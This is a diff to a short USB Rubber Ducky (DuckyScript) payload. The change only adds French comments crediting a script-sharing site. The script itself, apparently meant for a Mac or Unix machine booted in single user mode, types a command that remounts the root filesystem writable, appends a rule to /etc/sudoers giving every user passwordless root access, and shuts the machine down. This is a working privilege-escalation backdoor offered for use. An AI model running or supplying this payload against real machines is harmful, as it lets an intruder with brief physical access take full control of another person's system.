@@ -1,5 +1,8 @@
+REM ### Script téléchargé sur DuckyHub : https://duckyhub.efrei.tech/
+REM ### DEBUT DU SCRIPT
 DELAY 3000
 REM	###	Lancer d'abord la machine en single user mode
 DELAY 1000
 STRING mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now
 ENTER
+REM ### FIN DU SCRIPT
